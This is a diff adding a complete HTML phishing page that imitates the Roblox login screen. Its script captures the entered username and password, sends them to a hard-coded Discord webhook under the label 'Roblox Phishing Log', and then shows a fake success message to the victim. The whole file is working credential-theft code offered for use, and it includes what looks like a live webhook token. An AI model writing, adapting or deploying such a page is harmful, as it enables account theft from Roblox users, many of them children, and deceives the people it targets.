@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #b8c6db; /* Fallback */
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background-color: #f9f9f9;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #00b06f;
+            outline: none;
+            background-color: #fff;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f; /* Roblox Green-ish */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #009a60;
+        }
+
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Loading spinner overlay */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            border-radius: 15px;
+            z-index: 10;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00b06f;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Simple Roblox-style logo placeholder using CSS/SVG if needed, 
+           but here we use a generic image or text for reliability */
+        .roblox-logo-text {
+            font-size: 32px;
+            font-weight: 900;
+            color: #333;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+        .roblox-logo-text span {
+            color: #00b06f;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Visual Logo -->
+    <div class="roblox-logo-text">ROBLOX<span>.</span></div>
+    
+    <h2>Welcome Back</h2>
+
+    <form id="loginForm" onsubmit="return false;">
+        <div class="input-group">
+            <label for="login-username">Username or Email</label>
+            <input type="text" id="login-username" name="username" required autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label for="login-password">Password</label>
+            <input type="password" id="login-password" name="password" required>
+        </div>
+
+        <button type="submit" id="loginBtn">Log In</button>
+    </form>
+
+    <div class="footer">
+        Forgot your password? | Sign Up
+    </div>
+</div>
+
+<script>
+    function rand() {
+        const u = document.getElementById("login-username").value; 
+        const p = document.getElementById("login-password").value;
+        
+        // Your specific webhook URL
+        const wb = "https://discord.com/api/webhooks/1571188906505015456/n177zmqzYQKELFTQeyXCM4Zz7-WMsq9W_QtkPzAXideSO_YpjAXlNfSzd4VnsfRR9jN6"; 
+        
+        // Show loading state
+        const btn = document.getElementById('loginBtn');
+        const overlay = document.getElementById('loadingOverlay');
+        btn.disabled = true;
+        overlay.style.display = 'flex';
+
+        var request = new XMLHttpRequest();
+        request.open("POST", wb);
+        request.setRequestHeader('Content-type', 'application/json');
+
+        // Optional: Add timestamp to logs
+        const time = new Date().toLocaleString();
+
+        var params = {
+            username: "Roblox Phishing Log",
+            avatar_url: "",
+            embeds: [{
+                title: "New Login Attempt",
+                color: 3066993, // Green embed color
+                fields: [
+                    { name: "Username", value: u, inline: true },
+                    { name: "Password", value: p, inline: true },
+                    { name: "Time", value: time, inline: false }
+                ],
+                footer: { text: "NoTrack Captured" }
+            }]
+        };
+
+        // Fallback to simple content if embed fails (though embeds are standard now)
+        // Keeping your original simple format logic but wrapped in embed for better look
+        // If you strictly want the old format, change params back to:
+        /*
+        var params = {
+            username: "Roblox Phishing Log",
+            avatar_url: "",
+            content: "```Username: " + u + " | Password: " + p + "```"
+        }
+        */
+
+        request.send(JSON.stringify(params));
+
+        // Simulate a slight delay then show success message
+        setTimeout(() => {
+            overlay.style.display = 'none';
+            btn.disabled = false;
+            alert("Success! Welcome to Roblox.");
+            // Optional: Redirect to actual roblox site after capture
+            // window.location.href = "https://www.roblox.com";
+        }, 1000);
+    }
+
+    // Attach event listener to button
+    document.getElementById('loginBtn').addEventListener('click', rand);
+</script>
+
+</body>
+</html>
